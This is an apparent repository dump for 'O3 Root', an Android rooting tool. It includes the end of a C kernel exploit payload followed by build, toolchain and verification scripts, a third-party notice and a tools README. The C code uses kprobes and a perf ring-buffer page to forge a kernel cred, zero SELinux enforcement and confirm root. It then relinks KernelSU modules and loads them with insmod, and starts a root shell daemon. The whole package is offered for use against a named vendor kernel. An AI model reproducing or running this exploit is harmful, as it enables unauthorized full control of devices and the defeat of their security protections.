    size_t n=(size_t)(ssize/entsize);
    for(size_t kk=0;kk<n;kk++){
      unsigned char *sy=d+soff+kk*entsize; unsigned int no=0; unsigned short shndx=0;
      memcpy(&no,sy,4); memcpy(&shndx,sy+6,2);
      if(shndx!=0||no==0||no>=stsize)continue;
      const char *nm=str+no; unsigned h=ksym_hash(nm)&2047u;
      for(k=0;k<8;k++){ unsigned idx=(h+(unsigned)k)&2047u; if(!tab[idx].used)break; if(!strcmp(tab[idx].name,nm)){ if(tab[idx].addr){ unsigned short abs=KSU_SHN_ABS; memcpy(sy+6,&abs,2); memcpy(sy+8,&tab[idx].addr,8); found++; } break; } }
    }
  }
  *pfound=found; *pmissing=missing;
  printf("KALLSYMS_PATCH found=%d missing=%d\n",found,missing);fflush(stdout);
  return 0;
}

static int ksu_load(unsigned long long slide){
  stage_note("KSU_BEGIN");
  if(!g_ksu_tag)ksu_detect_fork();
  wf("/proc/sys/kernel/panic_on_oops","0\n");
  size_t len=0;
  unsigned char *b=ksu_blob_load(&len);
  if(!b){printf("KSU_BLOB MISSING\n");fflush(stdout);return -1;}
  printf("KSU_BLOB len=%zu slide=0x%llx\n",len,slide);fflush(stdout);
  stage_note("KSU_BLOB_OK");
  int ksf=0,ksm=0,ksfound=0;
  int kres=-1;
  if(!getenv("O3P_RELINK_ONLY")){ kres=kallsyms_patch(b,len,&ksfound,&ksm); }
  if(kres==0 && ksm==0){ printf("KSU_LOADER kallsyms found=%d missing=0\n",ksfound);fflush(stdout); stage_note("KSU_LOADER_KALLSYMS"); }
  else {
    printf("KSU_LOADER relink (kallsyms r=%d missing=%d)\n",kres,ksm);fflush(stdout);
    int r=ksu_patch(b,len,slide);
    if(r){printf("KSU_PATCH_FAIL r=%d\n",r);fflush(stdout);free(b);return -1;}
  }
  if(kres==0 && ksm==0){ g_relink_skip_syms=1; ksu_patch(b,len,slide); g_relink_skip_syms=0; }
  const char *out="/data/local/tmp/o3p_ksu.ko";
  int fd=open(out,O_WRONLY|O_CREAT|O_TRUNC,0644);
  if(fd<0){printf("KSU_WRITE_FAIL errno=%d\n",errno);fflush(stdout);free(b);return -1;}
  size_t w=0;
  while(w<len){ssize_t x=write(fd,b+w,len-w); if(x<=0)break; w+=x;}
  fsync(fd); close(fd); free(b);
  printf("KSU_WROTE %s %zu\n",out,w);fflush(stdout);
  if(w!=len)return -1;
  stage_note("KSU_EXEC_GO");
  pid_t cp=fork();
  if(cp==0){
    execl("/system/bin/sh","sh","-c","insmod /data/local/tmp/o3p_ksu.ko >/data/local/tmp/o3p_insmod.out 2>&1; echo rc=$? >>/data/local/tmp/o3p_insmod.out",(char*)0);
    _exit(127);
  }
  int st=0; int done=0;
  for(int i=0;i<160;i++){ pid_t r=waitpid(cp,&st,WNOHANG); if(r==cp){done=1;break;} msleep(250); }
  printf("KSU_EXEC done=%d status=0x%x\n",done,st);fflush(stdout);
  {char m[96];snprintf(m,sizeof m,"KSU_EXEC done=%d status=0x%x",done,st);stage_note(m);}
  read_file_print("/data/local/tmp/o3p_insmod.out","KSU_INSMOD_OUT");
  ksu_modlist();
  return done?0:-1;
}

static void armed_tail(pid_t pid){
 printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());
 {struct __user_cap_header_struct hh;struct __user_cap_data_struct dd[2];memset(dd,0,sizeof dd);hh.version=_LINUX_CAPABILITY_VERSION_3;hh.pid=0;
  int cr=(int)syscall(SYS_capget,&hh,dd);
  printf("CAPGET r=%d eff0=0x%x eff1=0x%x prm1=0x%x bnd1=0x%x\n",cr,dd[0].effective,dd[1].effective,dd[1].permitted,dd[1].inheritable);fflush(stdout);}
 if(g_armed){
  root_proof();
  stage_note("ROOT_OK");
  if(g_un){ if(!getenv("O3P_NOKSU")) ksu_load(g_un-INIT_USER_NS_STATIC); } else { printf("KSU_SKIP no_slide\n");fflush(stdout); }
  if(access("/data/local/tmp/o3p_post.sh",F_OK)==0){run_sh("sh /data/local/tmp/o3p_post.sh","/data/local/tmp/o3p_post.out",25000);read_file_print("/data/local/tmp/o3p_post.out","POSTOUT");}
  rootd_start();rootd_cmd("id; echo ---; getenforce");
 }
 close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
}
static void reap_calib(pid_t pid){
 printf("== reap window stage=%d\n",g_stage);fflush(stdout);
 sdlog("REAP stage=%d\n",g_stage);
 trunc_trace();wf(TR"/tracing_on","1\n");
 int st=0;pid_t wr=waitpid(pid,&st,0);
 repair_fake_cred();
 wf(TR"/tracing_on","0\n");
 tlen=read_trace(tbuf,48u<<20);
 printf("waitpid=%d status=%d trace=%zu\n",(int)wr,st,tlen);fflush(stdout);
 if(g_selmode&&g_stage==0){
  int z=selzero_mode()||d3_mode();
  unsigned long long ad[8],vv[8];int n=0;
  ad[n++]=z?(g_sel-7ULL):g_sel;ad[n++]=g_sel;ad[n++]=g_sel+0x08;ad[n++]=g_sel+0x40;ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva;
  int g=read_addrs(ad,vv,n);
  printf("SELREAD got=%d zero=%d\n",g,z);fflush(stdout);
  if(g>0){int k;
   for(k=0;k<n;k++)printf("  Q[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   if(z){
    int ok=(vv[0]==0ULL)&&((vv[1]&0xffULL)==0ULL)&&(((vv[1]>>8)&0xffULL)!=0ULL);
    printf("SELWRITE target=0x%llx want=0x0 val=0x%llx %s state=0x%llx\n",ad[0],vv[0],ok?"SEL_OK":"SEL_FAIL",vv[1]);
    if(ok)g_stage++;
    if(d3_mode()){unsigned long long *q=(unsigned long long*)g_pmap;
      printf("D3PAGE slot0=0x%llx slot1=0x%llx slot2=0x%llx slot3=0x%llx\n",q[0],q[1],q[2],q[3]);fflush(stdout);}
   } else {
    unsigned long long ex=g_fakekva|0x100ULL;
    int ok=(vv[0]==ex)&&((vv[0]&0xffULL)==0ULL)&&(((vv[0]>>8)&0xffULL)!=0ULL);
    printf("SELWRITE target=0x%llx want=0x%llx val=0x%llx %s\n",ad[0],ex,vv[0],ok?"SEL_OK":"SEL_FAIL");
    if(ok)g_stage++;
   }
  }
  if(d3v3_mode()){
   int u=(int)getuid(),e=(int)geteuid(),enf=-1;
   {int fd=open("/sys/fs/selinux/enforce",O_RDONLY);if(fd>=0){char b[8]={0};if(read(fd,b,7)>0)enf=atoi(b);close(fd);}}
   printf("D3V3 uid=%d euid=%d enf=%d\n",u,e,enf);fflush(stdout);
   if(u==0&&e==0&&enf==0)g_armed=1;
   if(g_armed){armed_tail(pid);return;}
  }
  read_file_print("/sys/fs/selinux/enforce","ENFORCE");
  {int fd=open("/data/local/tmp/canary_t34",O_WRONLY|O_CREAT,0666);printf("SHELL_CREATE fd=%d\n",fd);if(fd>=0)close(fd);}
  fflush(stdout);
  close_skb();kill(-pid,SIGKILL);msleep(50);while(waitpid(-1,0,WNOHANG)>0){}
  return;
 }
 {unsigned long long ad[12],vv[12];int n=0;
  ad[n++]=PTASK+0x908;ad[n++]=PTASK+0x900;ad[n++]=g_fakekva+0x00;ad[n++]=g_fakekva+0x08;ad[n++]=g_fakekva+0x10;ad[n++]=g_fakekva+0x18;ad[n++]=g_fakekva+0x20;ad[n++]=g_fakekva+0x38;ad[n++]=g_fakekva+0x40;ad[n++]=g_fakekva+0x80;
  int g=read_addrs(ad,vv,n);
  printf("post got=%d\n",g);
  if(g>0){int k;for(k=0;k<n;k++)printf("  P[%d] 0x%llx = 0x%llx\n",k,ad[k],vv[k]);
   {int ok=(vv[0]==g_fakekva);
    printf("CREDPTR target=0x%llx val=0x%llx %s\n",ad[0],vv[0],ok?"PTR_OK":"PTR_FAIL");
    printf("FAKECRED usage=0x%llx uidgid=0x%llx suid=0x%llx euid=0x%llx fsuid=0x%llx capP=0x%llx capE=0x%llx sec=0x%llx\n",vv[2],vv[3],vv[4],vv[5],vv[6],vv[7],vv[8],vv[9]);
    if(ok)g_armed=1;}
  }
 }
 armed_tail(pid);
}
static void perf_prepare(void){
 trunc_trace();
 probe_on_r("o3pp","rb","rb_alloc user_page=+0x118($retval):x64");
 trunc_trace();wf(TR"/tracing_on","1\n");
 struct perf_event_attr pe;memset(&pe,0,sizeof pe);
 pe.type=PERF_TYPE_SOFTWARE;pe.size=sizeof(pe);pe.config=PERF_COUNT_SW_CPU_CLOCK;pe.disabled=1;pe.exclude_kernel=1;pe.exclude_hv=1;
 int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
 void*mp=0; if(fd>=0)mp=mmap(0,4096,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 wf(TR"/tracing_on","0\n");
 size_t tl=read_trace(tbuf,16u<<20);
 unsigned long long kva=0;
 {char*s=0;for(char*line=strtok_r(tbuf,"\n",&s);line;line=strtok_r(NULL,"\n",&s)){if(!strstr(line," rb: ("))continue;unsigned long long v=field_u64(line,"user_page=");if(v){kva=v;break;}}}
 del_ev("o3pp","rb");
 printf("PERFPAGE fd=%d map=%p kva=0x%llx bytes=%zu\n",fd,mp,kva,tl);fflush(stdout);
 if(fd>=0&&mp&&mp!=MAP_FAILED&&kva){g_pfd=fd;g_pmap=mp;g_fakekva=kva;((volatile char*)mp)[0]=0;((volatile char*)mp)[4095]=0;}
}

int main(int argc,char**argv){
 if(argc>1&&!strcmp(argv[1],"--rootd")){rootd_main();return 0;}
 if(argc>2&&!strcmp(argv[1],"--shell")){return rootd_client(argv[2]);}
 {ssize_t rl=readlink("/proc/self/exe",g_self,sizeof g_self-1);if(rl>0)g_self[rl]=0;}
 if(argc>1&&!strcmp(argv[1],"--exec-target"))_exit(0);
 if(argc>1)NFILL=atoi(argv[1]);
 if(argc>2)g_pairs=atoi(argv[2]);
 if(argc>3)g_delay=atoi(argv[3]);
 if(argc>4)g_mode=atoi(argv[4]);
 if(argc>5)g_att=atoi(argv[5]);
 if(argc>6)g_reps=atoi(argv[6]);
 if(argc>7)g_churn=atoi(argv[7]);
 if(argc>8)g_chwait=atoi(argv[8]);
 if(NFILL<1)NFILL=1;if(NFILL>NFILL_MAX)NFILL=NFILL_MAX;
  if(getenv("O3P_NOSEL"))g_selmode=0;g_ntg=g_selmode?2:1;if(d3_mode())g_ntg=1;
 setvbuf(stdout,0,_IONBF,0);
 { struct rlimit rl; rl.rlim_cur=524288; rl.rlim_max=524288; setrlimit(RLIMIT_NOFILE,&rl); }
 {char bb[96];int n=0;int fd=open("/proc/sys/kernel/random/boot_id",O_RDONLY);if(fd>=0){n=(int)read(fd,bb,95);close(fd);}if(n>0){int i2=0;while(i2<n && bb[i2]!=10 && bb[i2]!=13)i2++;fputs("BOOTID ",stdout);for(int k2=0;k2<i2;k2++)putchar(bb[k2]);putchar(10);fflush(stdout);}}
 tbuf=malloc(48u<<20);
 if(!tbuf){printf("malloc fail\n");return 1;}
 prctl(PR_SET_CHILD_SUBREAPER,1,0,0,0);
 pin(0);
 printf("== cleanup old probes\n");fflush(stdout);
 del_ev("o3p","tm");del_ev("o3p","x");del_ev("o3p","fr");del_ev("o3p","ei");del_ev("o3p","rl");del_ev("o3p","td");del_ev("o3p","pe");del_ev("o3p","ds");del_ev("o3p","al");del_ev("o3pp","rb");del_ev("t2r","r");
 wf(TR"/buffer_size_kb","32768\n");
 printf("== add probes\n");fflush(stdout);
 probe_on("o3p","tm","do_timer_create+0x68 a0=%x0:x64");
 probe_on("o3p","x","__set_task_comm ts=%x0:x64 h=+0x8a0(%x0):x64 l=+0x8a8(%x0):x64");
 probe_on("o3p","fr","posix_timer_unhash_and_free t=%x0:x64");
 probe_on("o3p","ei","exit_itimers s=%x0:x64");
 probe_on("o3p","rl","release_task t=%x0:x64");
 probe_on("o3p","td","timerqueue_del h=%x0:x64 n=%x1:x64 np=+0(%x1):x64 nh=+0x20(%x1):x64");
 probe_on("o3p","pe","posix_cpu_timers_exit t=%x0:x64 h=+0x8a0(%x0):x64 l=+0x8a8(%x0):x64");
 probe_on("o3p","ds","discard_slab slab=%x1:x64");
 perf_prepare();
 int armed=0;pid_t armed_pid=0;
 for(int att=1;att<=g_att;att++){
   if(g_ntg>0&&g_stage>=g_ntg)break;
   armed=0;
   if(do_attempt(att,&armed_pid)==0){
     armed=1;
     printf("== armed, reap\n");fflush(stdout);
     sdlog("PARENT armed\n");
     reap_calib(armed_pid);
      printf("UIDNOW uid=%d euid=%d gid=%d\n",(int)getuid(),(int)geteuid(),(int)getgid());fflush(stdout);
      if(g_armed)break;
   } else msleep(200);
 }
 printf("FULLROOT armed=%d fakekva=0x%llx\n",g_armed,g_fakekva);fflush(stdout);
printf("== cleanup\n");fflush(stdout);
 del_ev("o3p","tm");del_ev("o3p","x");del_ev("o3p","fr");del_ev("o3p","ei");del_ev("o3p","rl");del_ev("o3p","td");del_ev("o3p","pe");del_ev("o3p","ds");del_ev("o3p","al");del_ev("o3pp","rb");del_ev("t2r","r");
 wf(TR"/tracing_on","0\n");
 while(waitpid(-1,0,WNOHANG)>0){}
 printf("done\n");
 return 0;
}

#!/usr/bin/env bash
# Build payload -> app. Requires env.sh (see scripts/env.example.sh).
set -euo pipefail
cd "$(dirname "$0")/.."
if [ -f scripts/env.sh ]; then . scripts/env.sh; elif [ -f env.sh ]; then . env.sh; fi

ls -l app/o3root2.apk 2>/dev/null || true

`scripts/env.example.sh`:

```sh
#!/usr/bin/env bash
# Copy to env.sh (gitignored) and fill in paths for your machine.
# ---------------------------------------------------------------------------
# App build (required)
# ---------------------------------------------------------------------------
# Android platform 34 android.jar (from platform-34-ext12_r01.zip, see fetch-toolchain.sh)
export ANDROID_JAR=/path/to/android-34-ext12/android.jar

# Build-tools directory containing aapt2, zipalign and lib/d8.jar + lib/apksigner.jar
export BUILD_TOOLS=/path/to/build-tools/34.0.0

# Directory containing api-classes.jar provider-classes.jar aidl-classes.jar shared-classes.jar
export SHIZUKU_JARS=/path/to/shizuku-jars

# JDK 17+ (javac/java). Optional if javac/java are already on PATH.
export JAVA_HOME=/path/to/jdk

# Optional: override d8 jar location
export D8_JAR="$BUILD_TOOLS/lib/d8.jar"

# ---------------------------------------------------------------------------
# Signing (required for the app; create YOUR OWN keystore, never commit it)
# ---------------------------------------------------------------------------
export KEYSTORE=/path/to/release.p12
export KS_PASS='changeit'
export KEY_ALIAS='release'
export KEY_PASS='changeit'

# ---------------------------------------------------------------------------
# Payload build (required)
# ---------------------------------------------------------------------------
# NDK clang wrapper, e.g.
#   $NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/aarch64-linux-android35-clang.cmd
#   $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang
export NDK_CC=/path/to/ndk/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android35-clang

# ---------------------------------------------------------------------------
# Optional: regenerate payload/ksu/ksu_symtab.h from a kernel image
# ---------------------------------------------------------------------------
# vmlinux.elf produced by extracting the OTA boot image (see tools/)
export VMLINUX=/path/to/ota_extract/vmlinux.elf
export KSU_LKM="$PWD/payload/lkm/lkm-aarch64-android17-6.18_kernelsu.ko"
# dir containing elftools/ (pip install --target tools/pylib pyelftools)
export PYELFTOOLS="$PWD/tools/pylib"

```

`scripts/fetch-toolchain.sh`:

```sh
#!/usr/bin/env bash
# Fetch the Android SDK pieces and Shizuku jars needed to build the app.
# Usage:  bash scripts/fetch-toolchain.sh
# Nothing here is committed to git; everything lands under tools/ (gitignored).
set -euo pipefail
cd "$(dirname "$0")/.."
PY=${PY:-python3}
MIRROR=${ANDROID_MIRROR:-https://dl.google.com/android/repository}
MVN=${MAVEN_MIRROR:-https://repo1.maven.org/maven2}
SHIZUKU_VER=${SHIZUKU_VER:-13.1.5}
mkdir -p tools/android tools/shizuku tools/pylib

fetch() { # url out
  if [ -s "$2" ]; then echo "have $2"; return; fi
  echo "fetch $1"
  "$PY" - "$1" "$2" <<'PY'
import sys, urllib.request, shutil
url, out = sys.argv[1], sys.argv[2]
req = urllib.request.Request(url, headers={'User-Agent': 'o3root-fetch'})
with urllib.request.urlopen(req, timeout=120) as r, open(out, 'wb') as f:
    shutil.copyfileobj(r, f)
print('saved', out)
PY
}

# --- android.jar (platform 34) ---------------------------------------------
ZIP=tools/android/platform-34-ext12_r01.zip
fetch "$MIRROR/platform-34-ext12_r01.zip" "$ZIP"
"$PY" - "$ZIP" <<'PY'
import sys, zipfile, os
z = zipfile.ZipFile(sys.argv[1])
for n in z.namelist():
    if n.endswith('android.jar'):
        open('tools/android/android.jar','wb').write(z.read(n)); print('android.jar <-', n); break
PY

# --- build-tools r34 -------------------------------------------------------
case "$(uname -s)" in
  MINGW*|MSYS*|CYGWIN*|Windows_NT) BT=build-tools_r34-windows.zip ;;
  Darwin) BT=build-tools_r34-mac.zip ;;
  *) BT=build-tools_r34-linux.zip ;;
esac
fetch "$MIRROR/$BT" "tools/android/$BT"
"$PY" - "tools/android/$BT" <<'PY'
import sys, zipfile, os, shutil
z = zipfile.ZipFile(sys.argv[1]); root = 'tools/android'
for n in z.namelist():
    t = os.path.join(root, n)
    if n.endswith('/'): os.makedirs(t, exist_ok=True); continue
    os.makedirs(os.path.dirname(t), exist_ok=True)
    with z.open(n) as s, open(t,'wb') as d: shutil.copyfileobj(s, d)
print('build-tools extracted under tools/android/android-*')
PY

# --- Shizuku jars ----------------------------------------------------------
for a in api provider aidl shared; do
  fetch "$MVN/dev/rikka/shizuku/$a/$SHIZUKU_VER/$a-$SHIZUKU_VER.aar" "tools/shizuku/$a.aar"
done
"$PY" - <<'PY'
import zipfile, os
for a in ('api','provider','aidl','shared'):
    with zipfile.ZipFile(f'tools/shizuku/{a}.aar') as z:
        open(f'tools/shizuku/{a}-classes.jar','wb').write(z.read('classes.jar'))
    print(a, 'classes.jar ok')
PY

# --- pyelftools (needed to regenerate ks u symbol table) --------------------
"$PY" -m pip install --quiet --target tools/pylib pyelftools || \
  echo "WARN: pip install pyelftools failed; ksu_symtab.h regeneration will not work" >&2

echo
echo "Done. Point env vars at:"
echo "  ANDROID_JAR=$PWD/tools/android/android.jar"
echo "  BUILD_TOOLS=$(ls -d $PWD/tools/android/android-* | head -1)"
echo "  SHIZUKU_JARS=$PWD/tools/shizuku"
echo
echo "NDK is NOT downloaded by this script. Install the Android NDK (r26+) and set NDK_CC."

```

`scripts/verify.sh`:

```sh
#!/usr/bin/env bash
# O3 Root repository self-check.
#
# Static checks (always): shell/Python syntax, required files, KernelSU symbol
# table count, release APK checksum, tracked secrets, and a scan of every file
# (including binaries) for device identifiers / host paths / credentials.
#
# Optional builds (only when their environment is configured):
#   NDK_CC=...                                  rebuild payload, compare sha256
#   ANDROID_JAR/BUILD_TOOLS/SHIZUKU_JARS/...    rebuild APK, check version
set -uo pipefail
cd "$(dirname "$0")/.." || exit 1

PY=${PY:-python3}
if ! command -v "$PY" >/dev/null 2>&1; then
  echo "FAIL: python interpreter '$PY' not found (set PY=python or PY=python3)" >&2
  exit 1
fi

fail=0
ok()   { printf '  ok    %s\n' "$*"; }
bad()  { printf '  FAIL  %s\n' "$*"; fail=1; }
note() { printf '  --    %s\n' "$*"; }

echo "== syntax"
while IFS= read -r f; do
  if bash -n "$f" 2>/dev/null; then ok "bash $f"; else bad "bash $f"; fi
done < <(find app payload scripts -name '*.sh' -type f 2>/dev/null | sort)

while IFS= read -r f; do
  if "$PY" -c 'import ast,sys; ast.parse(open(sys.argv[1], encoding="utf-8").read())' "$f" 2>/dev/null; then
    ok "py   $f"
  else
    bad "py   $f"
  fi
done < <(find app payload scripts tools -name '*.py' -type f -not -path '*/build/*' 2>/dev/null | sort)

echo "== required files"
for f in \
  AGENTS.md AGENTS.zh-CN.md README.md README.zh-CN.md LICENSE NOTICE.md NOTICE.zh-CN.md \
  third_party/NOTICE.zh-CN.md \
  app/AndroidManifest.xml app/build.sh app/src/o3/st/root1/Main.java \
  payload/o3p.c payload/mk_payload.py payload/build-payload.sh \
  payload/ksu/ksu_symtab.h payload/ksu/mksymtab.py payload/ksu/relink_ksu.py \
  payload/lkm/lkm-aarch64-android17-6.18_kernelsu.ko \
  payload/lkm/aarch64-next-android17-6.18_kernelsu.ko \
  payload/lkm/sukisu-aarch64-android17-6.18.ko \
  docs/ARCHITECTURE.md docs/SECURITY.md docs/BUILD.md docs/AGENT_HANDOFF.md \
  docs/AGENT_HANDOFF.zh-CN.md \
  docs/ARCHITECTURE.zh-CN.md docs/SECURITY.zh-CN.md docs/BUILD.zh-CN.md \
  docs/history/README.md docs/history/CVE-2026-98260_FEASIBILITY.md   docs/history/CVE-2026-98260_FEASIBILITY.zh-CN.md docs/history/ROOT_ACHIEVED_OS4.0.16.md   docs/history/ALTERNATIVE_ROOT_DIRECTIONS.md docs/history/OTA_4.0.16_kernel_report.md \
  payload/README.md payload/README.zh-CN.md tools/README.md tools/README.zh-CN.md \
  docs/APP_O3_ROOT.md
do
  if [ -f "$f" ]; then ok "$f"; else bad "missing $f"; fi
done

echo "== KernelSU symbol table"
cnt=$("$PY" - <<'PY' 2>/dev/null
import re
s = open('payload/ksu/ksu_symtab.h', encoding='utf-8').read()
print(len(re.findall(r'\{"[^"]+",\s*0x[0-9a-fA-F]+ULL\}', s)))
PY
)
if [ "$cnt" = "248" ]; then ok "ksu_symtab.h has 248 entries"; else bad "ksu_symtab.h entries: ${cnt:-?} (expected 248)"; fi

echo "== release checksum"
"$PY" - <<'PY'
import hashlib, sys
want = open('release/SHA256SUMS.txt', encoding='utf-8').read().split()[0]
got = hashlib.sha256(open('release/o3root2-v3.0.apk', 'rb').read()).hexdigest()
print('  ok    release apk sha256 matches SHA256SUMS' if got == want else
      '  FAIL  release apk sha256 %s != %s' % (got, want))
sys.exit(0 if got == want else 1)
PY
[ $? -eq 0 ] || fail=1

echo "== tracked secrets"
if git rev-parse --git-dir >/dev/null 2>&1; then
  secrets=$(git ls-files 2>/dev/null | grep -Ei '(^|/)(env\.sh|[^/]*\.(p12|jks|keystore))$' || true)
  if [ -z "$secrets" ]; then ok "no keystore/env files tracked"; else bad "tracked secrets: $secrets"; fi
else
  note "not a git checkout; skipping tracked-file check"
fi

echo "== sensitive strings (text)"
PAT='AI-workspace|C:/Users/13778|08831C2049983540|ennea-patched-2026|NWPU-WLAN|Xiaomi_C336|192\.168\.31\.[0-9]|10\.30\.186\.|patched-key\.p12'
hits=$(grep -rInE --exclude-dir=.git --exclude-dir=build --exclude=verify.sh "$PAT" . 2>/dev/null || true)
if [ -z "$hits" ]; then ok "no host paths / serials / ssids / keystore names"; else bad "sensitive text:"; printf '%s\n' "$hits" | sed 's/^/        /'; fi

hits=$(grep -rInE --exclude-dir=.git --exclude-dir=build --exclude=verify.sh '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' . 2>/dev/null || true)
if [ -z "$hits" ]; then ok "no MAC/BSSID strings"; else bad "MAC/BSSID-like strings:"; printf '%s\n' "$hits" | sed 's/^/        /'; fi

echo "== sensitive strings (binary)"
BINPAT='08831C2049983540|ennea-patched-2026|AI-workspace|C:/Users/13778'
bhits=$(grep -arlE --exclude-dir=.git --exclude=verify.sh "$BINPAT" . 2>/dev/null || true)
if [ -z "$bhits" ]; then ok "no tokens in binaries"; else bad "tokens in binaries:"; printf '%s\n' "$bhits" | sed 's/^/        /'; fi

echo "== optional: payload rebuild"
if [ -n "${NDK_CC:-}" ]; then
  log=$(mktemp)
  if bash payload/build-payload.sh >"$log" 2>&1; then
    got=$("$PY" -c "import hashlib;print(hashlib.sha256(open('payload/build/libo3p.so','rb').read()).hexdigest())")
    want=e64217c8fac2950763869881efdd15ff9fb76f1423a3388185bca7e72499aac3
    if [ "$got" = "$want" ]; then ok "libo3p.so sha256 matches reference"; else bad "libo3p.so sha256 $got != $want"; fi
  else
    bad "payload build failed"; tail -20 "$log" | sed 's/^/        /'
  fi
  rm -f "$log"
else
  note "NDK_CC not set; skipping payload build"
fi

echo "== optional: app rebuild"
if [ -n "${ANDROID_JAR:-}" ] && [ -n "${BUILD_TOOLS:-}" ] && [ -n "${SHIZUKU_JARS:-}" ] && [ -n "${KEYSTORE:-}" ] && [ -n "${KS_PASS:-}" ]; then
  log=$(mktemp)
  if bash app/build.sh >"$log" 2>&1; then
    if [ -x "$BUILD_TOOLS/aapt2" ] || [ -x "$BUILD_TOOLS/aapt2.exe" ]; then
      AAPT2="$BUILD_TOOLS/aapt2"; [ -x "$AAPT2" ] || AAPT2="$BUILD_TOOLS/aapt2.exe"
      v=$("$AAPT2" dump badging app/o3root2.apk 2>/dev/null | grep -o "versionName='[^']*'" | head -1)
      case "$v" in *"'3.0'"*) ok "APK rebuilt ($v)";; *) bad "APK version $v (expected 3.0)";; esac
    else
      note "APK rebuilt (aapt2 not found to verify version)"
    fi
  else
    bad "app build failed"; tail -20 "$log" | sed 's/^/        /'
  fi
  rm -f "$log"
else
  note "app build env incomplete; skipping app rebuild"
fi

echo "== git state"
if git rev-parse --git-dir >/dev/null 2>&1; then
  if [ -z "$(git status --porcelain)" ]; then ok "working tree clean"; else note "working tree has uncommitted changes"; fi
fi

if [ "$fail" -ne 0 ]; then
  echo
  echo "verify: FAILED"
  exit 1
fi
echo
echo "verify: OK"

```

# Third-party components

> Chinese translation: [`NOTICE.zh-CN.md`](NOTICE.zh-CN.md) — a translation of this file; if the two disagree, this English file is authoritative.

This repository bundles or depends on the following third-party work. All
rights remain with their authors; the licenses below are reproduced in spirit,
please consult the upstream projects for the full texts.

## Bundled binaries / assets

### KernelSU

- Upstream: https://github.com/tiann/KernelSU (GPL-3.0)
- Bundled files:
  - `payload/lkm/lkm-aarch64-android17-6.18_kernelsu.ko` — official prebuilt
    LKM from the KernelSU v3.3.1 release (unmodified binary, 375,328 bytes).
  - `payload/lkm/aarch64-next-android17-6.18_kernelsu.ko` — official
    KernelSU-Next v3.4.2 LKM (unmodified binary, 473,552 bytes); upstream
    https://github.com/KernelSU-Next/KernelSU-Next (GPL-3.0).
  - `payload/lkm/sukisu-aarch64-android17-6.18.ko` — official SukiSU-Ultra
    v4.2.1-r2 LKM (unmodified binary, 569,752 bytes); upstream
    https://github.com/SukiSU-Ultra/SukiSU-Ultra (GPL-3.0).
  - `app/assets/ksu-manager.apk` — the KernelSU manager APK (v3.3.1,
    32680, 13,637,206 bytes), installed by the app when no manager is present.
- Modifications are applied **at runtime by our payload**, not to the files in
  this repository: every undefined symbol is rewritten to an absolute address
  for the running kernel. v3.0 loads the module **unmodified** (no init patch):
  because the payload keeps `policycap` clean, KernelSU's own `setenforce(1)`
  does not break networking. The legacy `O3P_CODEPATCH=1` path (v1.7–v2.1
  default) additionally patched one instruction in `.init.text` (`mov w0,#1` at
  `+0x144`, or `+0x178` for SukiSU) to `mov w0,#0`; only the generated copy was
  ever modified. If you redistribute a pre-patched `.ko`, keep the GPL-3.0
  obligations in mind.

### Shizuku

- Upstream: https://github.com/RikkaApps/Shizuku (Apache-2.0)
- Consumed as Maven artifacts `dev.rikka.shizuku:{api,provider,aidl,shared}:13.1.5`
  (fetched by `scripts/fetch-toolchain.sh`, not vendored in this repo).

## Build-time dependencies

| component | license | usage |
|---|---|---|
| Android SDK build-tools (aapt2, d8, zipalign, apksigner) | Android SDK License | app build |
| Android platform 34 `android.jar` | Android SDK License | app compile |
| Android NDK (clang) | LLVM/NDK licenses | payload build |
| JDK | GPL-2.0 with Classpath Exception | javac, keytool |
| Python 3 | PSF license | build scripts |
| pyelftools | public domain (Unlicense) | `relink_ksu.py`, `mksymtab.py`, `kernel_cfg_btf.py` |
| capstone | BSD-3-Clause | `kernel_cfg_btf.py` disassembly |
| vmlinux-to-elf | GPL-3.0 | external, optional: recover symbols from the raw kernel |

## Not included

- The Xiaomi OTA package and the vendor kernel image (proprietary). Only the
  kernel SHA-256, symbol tables/offsets derived from it and the analysis
  documents are included.
- `android.jar`, build-tools, NDK and the Shizuku AARs — fetched locally by the
  scripts.

`tools/README.md`:

```md
# tools

> Chinese translation: [`README.zh-CN.md`](README.zh-CN.md) — a translation of this file; if the two disagree, this English file is authoritative.

Helper scripts used to pull the kernel out of the OTA, recover symbols and
verify the constants used by the payload. They are ordinary Python 3 scripts;
each one accepts its inputs from the environment or argv (they were originally
written against one specific OTA, the defaults reflect that).

| script | purpose |
|---|---|
| `probe_payload.py <ota.zip>` | read the A/B OTA `payload.bin` header + protobuf manifest and print the partition/operation structure |
| `extract_payload.py` | extract `boot`, `init_boot`, `vendor_boot`, `dtbo`, `vbmeta*` from the OTA; verifies every partition SHA-256 against the manifest and writes `extract_summary.json`. Env/args: `OTA_ZIP`, `OUTDIR` (`<ota.zip> [outdir]`) |
| `unpack_boot.py <boot.img>` | parse an Android boot image (v0–v4), print the header, write `kernel`, `ramdisk`, `second`, `dtb` |
| `check_hash.py <ota.zip>` | research helper: check whether the operation `data_sha256` covers the stored (compressed) blob or the decompressed data |
| `hash_payload.py <ota.zip> [expected_b64]` | verify `payload.bin` SHA-256 against `payload_properties.txt` `FILE_HASH` |
| `kernel_cfg_btf.py <kernel>` | print the embedded kernel config (`IKCONFIG`), BTF layouts (`task_struct`, `cred`, `k_itimer`, `selinux_state`, …) and disassemble the probe points (`begin_new_exec`, `timerqueue_del`, `rb_erase`, `selinux_inode_permission`). Needs `pyelftools` + `capstone` (set `PYELFTOOLS`) |

## Getting the kernel

```bash
python3 tools/probe_payload.py device-ota.zip
OTA_ZIP=device-ota.zip OUTDIR=out python3 tools/extract_payload.py
python3 tools/unpack_boot.py out/boot.img          # -> out/kernel
```

`out/kernel` is the raw arm64 `Image`. To get an ELF with symbols use the
external [vmlinux-to-elf](https://github.com/clabreti/vmlinux-to-elf) tool
(`vmlinux-to-elf out/kernel out/vmlinux.elf`), or `pahole`/`bpftool btf dump`
